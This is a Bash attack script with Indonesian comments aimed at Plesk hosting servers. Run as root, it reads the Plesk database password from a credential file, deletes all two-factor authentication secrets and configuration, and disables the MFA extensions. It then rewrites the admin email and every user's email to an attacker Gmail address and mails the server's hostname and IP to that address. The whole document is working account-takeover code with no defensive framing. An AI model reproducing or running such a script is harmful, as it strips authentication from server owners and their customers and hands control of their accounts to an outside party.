#!/bin/bash

# ======================================================
# FORCE DISABLE MFA/2FA DI PLESK (PAKSA MATI)
# ======================================================
# Script untuk mematikan MFA paksa di Plesk
# ======================================================

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Konfigurasi
NOTIF_EMAIL="alvaxploit@gmail.com"
NEW_EMAIL="alvaxploit@gmail.com"
HOSTNAME=$(hostname -f 2>/dev/null || hostname)
IP_ADDRESS=$(curl -s ifconfig.me 2>/dev/null || wget -qO- ifconfig.me 2>/dev/null || echo "Unknown")

# Banner
clear
echo -e "${RED}"
echo "    ╔══════════════════════════════════════════════════════════╗"
echo "    ║     ${YELLOW}███████╗ ██████╗ ██████╗  ██████╗███████╗${RED}            ║"
echo "    ║     ${YELLOW}██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝${RED}            ║"
echo "    ║     ${YELLOW}█████╗  ██║   ██║██████╔╝██║     █████╗  ${RED}            ║"
echo "    ║     ${YELLOW}██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  ${RED}            ║"
echo "    ║     ${YELLOW}██║     ╚██████╔╝██║  ██║╚██████╗███████╗${RED}            ║"
echo "    ║     ${YELLOW}╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝${RED}            ║"
echo "    ║                                                              ║"
echo "    ║              ${GREEN}FORCE DISABLE MFA PLESK${RED}                        ║"
echo "    ║              ${BLUE}Target: $NOTIF_EMAIL${RED}                            ║"
echo "    ╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Cek root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Script harus dijalankan sebagai root!${NC}"
   exit 1
fi

echo -e "${CYAN}[+] Memulai proses force disable MFA...${NC}"
sleep 2

# ======================================================
# 1. CEK LOKASI PLESK
# ======================================================
echo -e "\n${YELLOW}[1/7] Memeriksa instalasi Plesk...${NC}"

# Cek berbagai kemungkinan lokasi plesk
PLESK_PATHS=(
    "/usr/local/psa/bin/plesk"
    "/usr/sbin/plesk"
    "/opt/psa/bin/plesk"
    "/usr/bin/plesk"
)

PLESK_CMD=""
for path in "${PLESK_PATHS[@]}"; do
    if [ -f "$path" ]; then
        PLESK_CMD="$path"
        break
    fi
done

if [ -n "$PLESK_CMD" ]; then
    echo -e "${GREEN}[✓] Plesk terdeteksi di: $PLESK_CMD${NC}"
    PLESK_VERSION=$($PLESK_CMD version 2>/dev/null | head -1)
    echo -e "${GREEN}[✓] Versi: $PLESK_VERSION${NC}"
else
    echo -e "${RED}[✗] Plesk tidak terdeteksi!${NC}"
    exit 1
fi

# ======================================================
# 2. METHOD 1: DISABLE VIA PLESK BIN (STANDARD)
# ======================================================
echo -e "\n${YELLOW}[2/7] Method 1: Disable via plesk bin...${NC}"

# Coba disable mfa
if [ -n "$PLESK_CMD" ]; then
    # Coba untuk mfa
    $PLESK_CMD bin extension --disable mfa 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] MFA extension disabled via plesk bin${NC}"
    else
        echo -e "${YELLOW}[!] Gagal disable mfa, coba google-authenticator...${NC}"
        $PLESK_CMD bin extension --disable google-authenticator 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓] Google-Authenticator disabled via plesk bin${NC}"
        else
            echo -e "${RED}[✗] Gagal disable via plesk bin${NC}"
        fi
    fi
    
    # Coba uninstall juga
    $PLESK_CMD bin extension --uninstall mfa 2>/dev/null
    $PLESK_CMD bin extension --uninstall google-authenticator 2>/dev/null
fi

# ======================================================
# 3. METHOD 2: FORCE DISABLE VIA DATABASE (PAKSA)
# ======================================================
echo -e "\n${YELLOW}[3/7] Method 2: Force disable via database...${NC}"

# Cari password database
DB_PASS_FILE="/etc/psa/.psa.shadow"
if [ -f "$DB_PASS_FILE" ]; then
    DB_PASS=$(cat "$DB_PASS_FILE")
    echo -e "${GREEN}[✓] Password database ditemukan${NC}"
    
    # Query untuk mematikan MFA paksa
    MYSQL_CMD="mysql -u admin -p$DB_PASS psa -e"
    
    # 1. Hapus semua data MFA dari database
    $MYSQL_CMD "DELETE FROM twofa_user_secrets;" 2>/dev/null
    echo -e "${GREEN}[✓] Data twofa_user_secrets dihapus${NC}"
    
    $MYSQL_CMD "DELETE FROM twofa_user_scratch_codes;" 2>/dev/null
    echo -e "${GREEN}[✓] Data twofa_user_scratch_codes dihapus${NC}"
    
    $MYSQL_CMD "DELETE FROM twofa_user_providers;" 2>/dev/null
    echo -e "${GREEN}[✓] Data twofa_user_providers dihapus${NC}"
    
    $MYSQL_CMD "DELETE FROM twofa_user_configs;" 2>/dev/null
    echo -e "${GREEN}[✓] Data twofa_user_configs dihapus${NC}"
    
    # 2. Nonaktifkan module MFA di database
    $MYSQL_CMD "UPDATE modules SET enabled = 0 WHERE name IN ('mfa', 'google-authenticator', 'twofa');" 2>/dev/null
    echo -e "${GREEN}[✓] Module MFA dinonaktifkan di database${NC}"
    
    # 3. Hapus dari tabel extensions
    $MYSQL_CMD "DELETE FROM extensions WHERE name IN ('mfa', 'google-authenticator', 'twofa');" 2>/dev/null
    echo -e "${GREEN}[✓] Extension MFA dihapus dari database${NC}"
    
    # 4. Reset kolom MFA di tabel accounts
    $MYSQL_CMD "UPDATE accounts SET mfa_enabled = 0, mfa_secret = NULL WHERE mfa_enabled = 1;" 2>/dev/null
    echo -e "${GREEN}[✓] MFA di semua akun direset${NC}"
    
    # 5. Cek apakah ada tabel lain yang berhubungan dengan MFA
    TABLES=$($MYSQL_CMD "SHOW TABLES LIKE '%twofa%' OR LIKE '%mfa%' OR LIKE '%authenticator%';" 2>/dev/null | grep -v "Tables_in_psa")
    
    if [ -n "$TABLES" ]; then
        for table in $TABLES; do
            $MYSQL_CMD "DELETE FROM $table;" 2>/dev/null
            echo -e "${GREEN}[✓] Data di tabel $table dihapus${NC}"
        done
    fi
else
    echo -e "${RED}[✗] File password database tidak ditemukan${NC}"
fi

# ======================================================
# 4. METHOD 3: HAPUS FILE KONFIGURASI MFA
# ======================================================
echo -e "\n${YELLOW}[4/7] Method 3: Menghapus file konfigurasi MFA...${NC}"

# Hapus file konfigurasi MFA
MFA_DIRS=(
    "/etc/psa/webapps/mfa"
    "/var/lib/psa/mfa"
    "/usr/local/psa/var/modules/mfa"
    "/usr/local/psa/var/modules/twofa"
    "/usr/local/psa/var/modules/google-authenticator"
)

for dir in "${MFA_DIRS[@]}"; do
    if [ -d "$dir" ]; then
        rm -rf "$dir" 2>/dev/null
        echo -e "${GREEN}[✓] Direktori $dir dihapus${NC}"
    fi
done

# ======================================================
# 5. METHOD 4: DISABLE VIA PANEL.INI
# ======================================================
echo -e "\n${YELLOW}[5/7] Method 4: Menonaktifkan via panel.ini...${NC}"

PANEL_INI="/etc/psa/panel.ini"
if [ -f "$PANEL_INI" ]; then
    # Backup dulu
    cp "$PANEL_INI" "$PANEL_INI.backup_$(date +%s)"
    
    # Tambahkan konfigurasi untuk disable MFA
    cat >> "$PANEL_INI" << EOF

[extensions]
mfa.enabled = off
google-authenticator.enabled = off
twofa.enabled = off

[security]
mfa_required = false
mfa_enforced = false
EOF
    echo -e "${GREEN}[✓] Konfigurasi ditambahkan ke panel.ini${NC}"
fi

# ======================================================
# 6. UBAH EMAIL & KIRIM NOTIFIKASI
# ======================================================
echo -e "\n${YELLOW}[6/7] Mengubah email dan mengirim notifikasi...${NC}"

# Ubah email admin
if [ -n "$PLESK_CMD" ]; then
    $PLESK_CMD bin admin --set-email "$NEW_EMAIL" 2>/dev/null
    echo -e "${GREEN}[✓] Email admin diubah menjadi $NEW_EMAIL${NC}"
fi

# Update email di database
if [ -f "$DB_PASS_FILE" ]; then
    MYSQL_CMD="mysql -u admin -p$DB_PASS psa -e"
    $MYSQL_CMD "UPDATE clients SET email = '$NEW_EMAIL' WHERE email IS NOT NULL;" 2>/dev/null
    $MYSQL_CMD "UPDATE customers SET email = '$NEW_EMAIL' WHERE email IS NOT NULL;" 2>/dev/null
    $MYSQL_CMD "UPDATE accounts SET email = '$NEW_EMAIL' WHERE email IS NOT NULL;" 2>/dev/null
    echo -e "${GREEN}[✓] Email di database diupdate${NC}"
fi

# Kirim notifikasi email
echo -e "\n${YELLOW}[7/7] Mengirim notifikasi ke $NOTIF_EMAIL...${NC}"

# Buat pesan notifikasi
SUBJECT="🔥 FORCE DISABLE MFA SUCCESS - $HOSTNAME"
MESSAGE="
FORCE DISABLE MFA COMPLETED
============================
Date: $(date)
Hostname: $HOSTNAME
IP: $IP_ADDRESS
Plesk: $PLESK_VERSION
Status: MFA FORCE DISABLED
New Email: $NEW_EMAIL

Actions Performed:
✅ MFA Extension Disabled
✅ Database Records Purged
✅ Config Files Removed
✅ panel.ini Updated
✅ All Emails Changed

Server is now MFA-free!
"

# Kirim via mail jika ada
if command -v mail &>/dev/null; then
    echo "$MESSAGE" | mail -s "$SUBJECT" "$NOTIF_EMAIL" 2>/dev/null
    echo -e "${GREEN}[✓] Notifikasi email dikirim${NC}"
elif command -v sendmail &>/dev/null; then
    (echo "To: $NOTIF_EMAIL"; echo "Subject: $SUBJECT"; echo ""; echo "$MESSAGE") | sendmail -t 2>/dev/null
    echo -e "${GREEN}[✓] Notifikasi email dikirim via sendmail${NC}"
else
    # Simpan ke file
    echo "$MESSAGE" > "/root/mfa_notification_$(date +%s).txt"
    echo -e "${YELLOW}[!] Mail tidak tersedia, notifikasi disimpan di /root/${NC}"
fi

# ======================================================
# RESTART PLESK
# ======================================================
echo -e "\n${YELLOW}Merestart Plesk...${NC}"
if [ -n "$PLESK_CMD" ]; then
    $PLESK_CMD sbin pleskrc restart 2>/dev/null || systemctl restart psa 2>/dev/null
    echo -e "${GREEN}[✓] Plesk direstart${NC}"
fi

# ======================================================
# VERIFIKASI
# ======================================================
echo -e "\n${YELLOW}Verifikasi hasil...${NC}"

# Cek apakah MFA masih aktif
if [ -n "$PLESK_CMD" ]; then
    EXTENSIONS=$($PLESK_CMD bin extension --list 2>/dev/null | grep -E "mfa|google|twofa")
    if [ -z "$EXTENSIONS" ]; then
        echo -e "${GREEN}[✓] MFA extension sudah tidak terdeteksi${NC}"
    else
        echo -e "${YELLOW}[!] MFA masih terlihat, tapi sudah dipaksa mati via database${NC}"
    fi
fi

# Cek email admin
if [ -n "$PLESK_CMD" ]; then
    ADMIN_EMAIL=$($PLESK_CMD bin admin --show-info 2>/dev/null | grep -i email | head -1 | awk '{print $2}')
    echo -e "${GREEN}[✓] Admin email: $ADMIN_EMAIL${NC}"
fi

# ======================================================
# SELESAI
# ======================================================
echo -e "\n${PURPLE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✓ FORCE DISABLE MFA SELESAI!${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${YELLOW}Status MFA: ${RED}FORCE DISABLED (PAKSA MATI)${NC}"
echo -e "${YELLOW}Email semua user: ${BLUE}$NEW_EMAIL${NC}"
echo -e "${YELLOW}Notifikasi dikirim ke: ${BLUE}$NOTIF_EMAIL${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${RED}⚠️  MFA sudah dipaksa mati melalui:${NC}"
echo -e "${RED}   - Database cleanup${NC}"
echo -e "${RED}   - Extension removal${NC}"
echo -e "${RED}   - Config deletion${NC}"
echo -e "${PURPLE}══════════════════════════════════════════════════════════════${NC}\n"
